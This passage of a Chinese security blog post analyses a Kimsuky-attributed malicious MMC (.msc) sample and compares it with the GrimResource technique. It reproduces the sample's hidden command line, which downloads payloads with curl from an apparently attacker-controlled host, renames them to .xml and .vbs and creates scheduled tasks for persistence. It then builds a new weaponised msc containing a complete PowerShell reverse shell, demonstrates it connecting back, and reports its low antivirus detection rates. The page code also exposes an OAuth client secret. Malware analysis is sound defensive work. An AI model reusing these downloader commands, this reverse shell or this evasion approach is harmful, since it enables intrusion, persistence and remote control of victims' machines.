class="string">&quot;&#123;656F3A6A-1A63-4FC4-9C9B-4B75AF6DF3A3&#125;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">String</span> <span class="attr">Name</span>=<span class="string">&quot;Name&quot;</span> <span class="attr">ID</span>=<span class="string">&quot;11&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">String</span> <span class="attr">Name</span>=<span class="string">&quot;Description&quot;</span> <span class="attr">ID</span>=<span class="string">&quot;12&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">String</span> <span class="attr">Name</span>=<span class="string">&quot;Tooltip&quot;</span> <span class="attr">Value</span>=<span class="string">&quot;&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Tasks</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Task</span> <span class="attr">Type</span>=<span class="string">&quot;CommandLine&quot;</span> <span class="attr">Command</span>=<span class="string">&quot;cmd.exe&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">String</span> <span class="attr">Name</span>=<span class="string">&quot;Name&quot;</span> <span class="attr">ID</span>=<span class="string">&quot;13&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">String</span> <span class="attr">Name</span>=<span class="string">&quot;Description&quot;</span> <span class="attr">ID</span>=<span class="string">&quot;14&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Symbol</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">Image</span> <span class="attr">Name</span>=<span class="string">&quot;Small&quot;</span> <span class="attr">BinaryRefIndex</span>=<span class="string">&quot;6&quot;</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">Image</span> <span class="attr">Name</span>=<span class="string">&quot;Large&quot;</span> <span class="attr">BinaryRefIndex</span>=<span class="string">&quot;7&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Symbol</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">CommandLine</span> <span class="attr">Directory</span>=<span class="string">&quot;&quot;</span> <span class="attr">WindowState</span>=<span class="string">&quot;Minimized&quot;</span> <span class="attr">Params</span>=<span class="string">&quot;/c mode 15,1<span class="symbol">&amp;amp;</span>curl -o <span class="symbol">&amp;quot;</span>c:\users\public\music\default1<span class="symbol">&amp;quot;</span> <span class="symbol">&amp;quot;</span>https://petssecondchance.larcity.dev/modules/mod_custom/tmpl/andy/css.php?na=xam1<span class="symbol">&amp;quot;</span><span class="symbol">&amp;amp;</span>curl -o <span class="symbol">&amp;quot;</span>c:\users\public\pictures\default1<span class="symbol">&amp;quot;</span> <span class="symbol">&amp;quot;</span>https://petssecondchance.larcity.dev/modules/mod_custom/tmpl/andy/css.php?na=sam1<span class="symbol">&amp;quot;</span><span class="symbol">&amp;amp;</span>move /y <span class="symbol">&amp;quot;</span>c:\users\public\music\default1<span class="symbol">&amp;quot;</span> <span class="symbol">&amp;quot;</span>c:\users\public\music\default1.xml<span class="symbol">&amp;quot;</span><span class="symbol">&amp;amp;</span>start explorer <span class="symbol">&amp;quot;</span>https://docs.google.com/document/d/1Z96Gq8lf7h688L0GeZMgAhjipRX1GLmL/edit<span class="symbol">&amp;quot;</span><span class="symbol">&amp;amp;</span>schtasks /create /tn TerminalServiceUpdater /xml c:\users\public\music\default1.xml /f<span class="symbol">&amp;amp;</span>curl -o <span class="symbol">&amp;quot;</span>c:\users\public\music\default2<span class="symbol">&amp;quot;</span> <span class="symbol">&amp;quot;</span>https://petssecondchance.larcity.dev/modules/mod_custom/tmpl/andy/css.php?na=xam2<span class="symbol">&amp;quot;</span><span class="symbol">&amp;amp;</span>curl -o <span class="symbol">&amp;quot;</span>c:\users\public\pictures\default2<span class="symbol">&amp;quot;</span> <span class="symbol">&amp;quot;</span>https://petssecondchance.larcity.dev/modules/mod_custom/tmpl/andy/css.php?na=sam2<span class="symbol">&amp;quot;</span><span class="symbol">&amp;amp;</span>move /y <span class="symbol">&amp;quot;</span>c:\users\public\music\default2<span class="symbol">&amp;quot;</span> <span class="symbol">&amp;quot;</span>c:\users\public\music\default2.xml<span class="symbol">&amp;quot;</span><span class="symbol">&amp;amp;</span>move /y <span class="symbol">&amp;quot;</span>c:\users\public\pictures\default1<span class="symbol">&amp;quot;</span> <span class="symbol">&amp;quot;</span>c:\users\public\pictures\default1.vbs<span class="symbol">&amp;quot;</span><span class="symbol">&amp;amp;</span>schtasks /create /tn TermServiceUpdater /xml c:\users\public\music\default2.xml /f<span class="symbol">&amp;amp;</span>move /y <span class="symbol">&amp;quot;</span>c:\users\public\pictures\default2<span class="symbol">&amp;quot;</span> <span class="symbol">&amp;quot;</span>c:\users\public\pictures\default2.vbs<span class="symbol">&amp;quot;</span>&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">Task</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Tasks</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">BookMark</span> <span class="attr">Name</span>=<span class="string">&quot;TargetNode&quot;</span> <span class="attr">NodeID</span>=<span class="string">&quot;1&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ConsoleTaskpad</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ConsoleTaskpads</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>刚刚提到<code>ConsoleTaskpads</code>是MMC的任务面板配置</p>
+<p>其中<code>&lt;Task Type=&quot;CommandLine&quot; Command=&quot;cmd.exe&quot;&gt;</code>部分指定了类型为命令行，并且调用了cmd.exe</p>
+<p>继续跟到下面<code>CommandLine</code>部分，首先制定了窗口初始状态为最小化，然后通过Params指定了命令行参数</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">/c <span class="built_in">mode</span> <span class="number">15</span>,<span class="number">1</span></span><br><span class="line">curl -o &quot;c:\users\public\music\default1&quot; &quot;https://petssecondchance.larcity.dev/modules/mod_custom/tmpl/andy/css.php?na=xam1&quot;</span><br><span class="line">curl -o &quot;c:\users\public\pictures\default1&quot; &quot;https://petssecondchance.larcity.dev/modules/mod_custom/tmpl/andy/css.php?na=sam1&quot;</span><br><span class="line"><span class="built_in">move</span> /y &quot;c:\users\public\music\default1&quot; &quot;c:\users\public\music\default1.xml&quot;</span><br><span class="line"><span class="built_in">start</span> explorer &quot;https://docs.google.com/document/d/<span class="number">1</span>Z96Gq8lf7h688L0GeZMgAhjipRX1GLmL/edit&quot;</span><br><span class="line">schtasks /create /tn TerminalServiceUpdater /xml c:\users\public\music\default1.xml /f</span><br><span class="line">curl -o &quot;c:\users\public\music\default2&quot; &quot;https://petssecondchance.larcity.dev/modules/mod_custom/tmpl/andy/css.php?na=xam2&quot;</span><br><span class="line">curl -o &quot;c:\users\public\pictures\default2&quot; &quot;https://petssecondchance.larcity.dev/modules/mod_custom/tmpl/andy/css.php?na=sam2&quot;</span><br><span class="line"><span class="built_in">move</span> /y &quot;c:\users\public\music\default2&quot; &quot;c:\users\public\music\default2.xml&quot;</span><br><span class="line"><span class="built_in">move</span> /y &quot;c:\users\public\pictures\default1&quot; &quot;c:\users\public\pictures\default1.vbs&quot;</span><br><span class="line">schtasks /create /tn TermServiceUpdater /xml c:\users\public\music\default2.xml /f</span><br><span class="line"><span class="built_in">move</span> /y &quot;c:\users\public\pictures\default2&quot; &quot;c:\users\public\pictures\default2.vbs&quot;</span><br></pre></td></tr></table></figure>
+
+<p>第一行指定了命令行窗口模式为15,1（黑背景色白前景色，显示1行）</p>
+<p>接下来两行下载了两份文件（这里以参数为称，xam1和xam1）并移动到music和picture目录的default1，现在发现两份文件地址均已经删除</p>
+<p><img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240914102233724.png" alt="image-20240914102233724"></p>
+<p>随后将music目录下的default1改为了xml格式，紧接着打开资源管理器访问了<code>https://docs.google.com/document/d/1Z96Gq8lf7h688L0GeZMgAhjipRX1GLmL/edit</code>，现在已被谷歌文档删除，推测为和用来伪装的字符串相关话题内容，用以迷惑受害者以为仅打开了链接</p>
+<p><img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240914102656412.png" alt="image-20240914102656412"></p>
+<p>访问链接后通过schtasks命令以default1.xml为模板创建了计划任务<code>TerminalServiceUpdater</code></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /tn TerminalServiceUpdater /xml c:\users\public\music\default1.xml /f</span><br></pre></td></tr></table></figure>
+
+<p>后面又下载了两份文件，现也已删除，后面就是相同的操作这里不再赘述</p>
+<p>其中sam1和sam2最后改名为vbs，这里应该才是计划任务最终执行的payload，因为都被删除了这里就不多做分析</p>
+<h2 id="GrimResource"><a href="#GrimResource" class="headerlink" title="GrimResource?"></a>GrimResource?</h2><p>最开始提到了GrimResource最初是通过利用apds.dll库中存在的一个旧的跨站脚本（XSS）漏洞在mmc.exe的上下文中执行任意js代码，而本文的攻击手段则有所不同，所以严格意义上来说该样本并不是使用了GrimResource技术，不过我们还是看看作为攻击手段的有效性</p>
+<h3 id="异同"><a href="#异同" class="headerlink" title="异同"></a>异同</h3><ul>
+<li>同：均是利用msc文件为载体，可以有效绕过安全软件</li>
+<li>异：GrimResource是利用apds.dll库的漏洞和DotNetToJs技术，随着版本更新会有一定局限性；该样本中则是利用msc文件本身的特性，创建了一个迷惑性的msc操作快捷方式，引导受害者手动点击（更接近于钓鱼）</li>
+</ul>
+<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>我们这里以该样本为基础，尝试自己构建一个新的恶意msc文件用以反弹shell</p>
+<p>首先构造一个反弹用的powershell脚本</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-Object</span> System.Net.Sockets.TCPClient(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">14512</span>);<span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream();[<span class="built_in">byte</span>[]]<span class="variable">$bytes</span> = <span class="number">0</span>..<span class="number">65535</span>|%&#123;<span class="number">0</span>&#125;;<span class="keyword">while</span>((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, <span class="number">0</span>, <span class="variable">$bytes</span>.Length)) <span class="operator">-ne</span> <span class="number">0</span>)&#123;;<span class="variable">$data</span> = (<span class="built_in">New-Object</span> <span class="literal">-TypeName</span> System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,<span class="number">0</span>, <span class="variable">$i</span>);<span class="variable">$sendback</span> = (<span class="built_in">iex</span> <span class="variable">$data</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span> | <span class="built_in">Out-String</span> );<span class="variable">$sendback2</span>  = <span class="variable">$sendback</span> + <span class="string">&quot;PS &quot;</span> + (<span class="built_in">pwd</span>).Path + <span class="string">&quot;&gt; &quot;</span>;<span class="variable">$sendbyte</span> = ([<span class="type">text.encoding</span>]::ASCII).GetBytes(<span class="variable">$sendback2</span>);<span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,<span class="number">0</span>,<span class="variable">$sendbyte</span>.Length);<span class="variable">$stream</span>.Flush()&#125;;<span class="variable">$client</span>.Close()</span><br></pre></td></tr></table></figure>
+
+<p>powershell编码<br><img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240914111612221.png" alt="image-20240914111612221"></p>
+<p>接下来带入样本中，开启nc监听</p>
+<p><img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240914112951079.png" alt="image-20240914112951079"></p>
+<p>成功开启反弹</p>
+<h3 id="查杀率"><a href="#查杀率" class="headerlink" title="查杀率"></a>查杀率</h3><p>微步：</p>
+<p><img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240914112852055.png" alt="image-20240914112852055"></p>
+<p><img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240914112915683.png" alt="image-20240914112915683"></p>
+<p>可以看到目前微步的查杀率还是非常低的，并且主要是powershell反弹shell的特征</p>
+<p>VT：</p>
+<p><img src= "/img/friend_404.gif" data-lazy-src="/image/image-20240914113034041.png" alt="image-20240914113034041"></p>
+<p>VT则因为国外平台的原因已被标记，并且笔者这里跟原样本特征重合度过高，导致几乎都正常识别为了Kimsuky相关（但也只有12&#x2F;63），实际上自己修改后查杀率还会进一步降低</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>GrimResource作为一种新型的攻击手段，想必一段时间内仍然会活跃在大众视野中，其利用手段也远远不止最初的用法，相信也能给攻击和防守视角带来一些启发</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://y5neko.github.com">Y5neKO</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://y5neko.github.com/2024/09/12/%E4%BB%8EKimsuky%E7%BB%84%E7%BB%87msc%E6%94%BB%E5%87%BB%E6%A0%B7%E6%9C%AC%E5%88%B0GrimResource/">https://y5neko.github.com/2024/09/12/从Kimsuky组织msc攻击样本到GrimResource/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://y5neko.github.com" target="_blank">Y5neKO's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%AC%94%E8%AE%B0/">笔记</a><a class="post-meta__tags" href="/tags/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/">样本分析</a></div><div class="post_share"><div class="social-share" data-image="/image/image-20240914112951079.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/08/20/Java%E5%AE%89%E5%85%A8/" title="Java安全基础"><img class="cover" src= "/img/friend_404.gif" data-lazy-src="/image/image-20230808142318172.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Java安全基础</div></div></a></div><div class="next-post pull-right"><a href="/2024/09/12/Nanocore%E6%81%B6%E6%84%8F%E8%84%9A%E6%9C%AC%E5%88%86%E6%9E%90/" title="Nanocore恶意程序分析"><img class="cover" src= "/img/friend_404.gif" data-lazy-src="/image/image-20240912170857294.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Nanocore恶意程序分析</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/09/12/Nanocore%E6%81%B6%E6%84%8F%E8%84%9A%E6%9C%AC%E5%88%86%E6%9E%90/" title="Nanocore恶意程序分析"><img class="cover" src= "/img/friend_404.gif" data-lazy-src="/image/image-20240912170857294.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-12</div><div class="title">Nanocore恶意程序分析</div></div></a></div><div><a href="/2023/03/06/Java%E5%9F%BA%E7%A1%80/" title="Java学习笔记"><img class="cover" src= "/img/friend_404.gif" data-lazy-src="/image/image-20220429122054874.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-06</div><div class="title">Java学习笔记</div></div></a></div><div><a href="/2024/03/25/IDA%20Pro%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/" title="IDA Pro操作指南"><img class="cover" src= "/img/friend_404.gif" data-lazy-src="/image/Pasted%20image%2020240329103100.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-25</div><div class="title">IDA Pro操作指南</div></div></a></div><div><a href="/2023/03/29/Linux%E8%BF%90%E7%BB%B4%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87/" title="Linux运维疑难杂症"><img class="cover" src= "/img/friend_404.gif" data-lazy-src="/image/337b44cbd42152857ed44339a37e878c.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-29</div><div class="title">Linux运维疑难杂症</div></div></a></div><div><a href="/2023/11/09/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80/" title="基础免杀"><img class="cover" src= "/img/friend_404.gif" data-lazy-src="/image/image-20231109152818466.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-09</div><div class="title">基础免杀</div></div></a></div><div><a href="/2024/03/28/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" title="数据结构"><img class="cover" src= "/img/friend_404.gif" data-lazy-src="/image/Pasted%20image%2020240328112106.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-28</div><div class="title">数据结构</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="gitalk-container"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%8EKimsuky%E7%BB%84%E7%BB%87msc%E6%94%BB%E5%87%BB%E6%A0%B7%E6%9C%AC%E5%88%B0GrimResource"><span class="toc-number">1.</span> <span class="toc-text">从Kimsuky组织msc攻击样本到GrimResource</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#msc%E6%96%87%E4%BB%B6"><span class="toc-number">1.2.</span> <span class="toc-text">msc文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#msc%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84"><span class="toc-number">1.3.</span> <span class="toc-text">msc文件结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90"><span class="toc-number">1.4.</span> <span class="toc-text">样本分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E4%BB%A3%E7%A0%81"><span class="toc-number">1.4.1.</span> <span class="toc-text">核心代码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GrimResource"><span class="toc-number">1.5.</span> <span class="toc-text">GrimResource?</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%82%E5%90%8C"><span class="toc-number">1.5.1.</span> <span class="toc-text">异同</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.5.2.</span> <span class="toc-text">复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%9D%80%E7%8E%87"><span class="toc-number">1.5.3.</span> <span class="toc-text">查杀率</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.6.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2017 - 2024 By Y5neKO</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">行走于黑白之间.</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><div class="js-pjax"><script>(() => {
+  const initGitalk = () => {
+    const gitalk = new Gitalk(Object.assign({
+      clientID: '4d2d58bafea4c026b68f',
+      clientSecret: '61a3976d66520d7bfd80d2de0e9e60fe31820603',
+      repo: 'y5neko.github.io',
+      owner: 'Y5neKO',
+      admin: ['Y5neKO'],
+      id: '4b200ccb091053aaa11a1c3c5b968d77',
+      updateCountCallback: commentCount
+    },null))
+
+    gitalk.render('gitalk-container')
+  }
+
+  const loadGitalk = async() => {
+    if (typeof Gitalk === 'function') initGitalk()
+    else {
+      await getCSS('https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css')
+      await getScript('https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.js')
+      initGitalk()
+    }
+  }
+  
+  const commentCount = n => {
+    const isCommentCount = document.querySelector('#post-meta .gitalk-comment-count')
+    if (isCommentCount) {
+      isCommentCount.textContent= n
+    }
+  }
+
+  if ('Gitalk' === 'Gitalk' || !false) {
+    if (false) btf.loadComment(document.getElementById('gitalk-container'), loadGitalk)
+    else loadGitalk()
+  } else {
+    window.loadOtherComment = loadGitalk
+  }
+})()</script></div><div class="aplayer no-destroy" data-id="2102314888" data-server="netease" data-type="playlist" data-fixed="true" data-autoplay="true" data-mini="true"> </div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener
+  btf.removeGlobalFnEvent('pjax')
+  btf.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
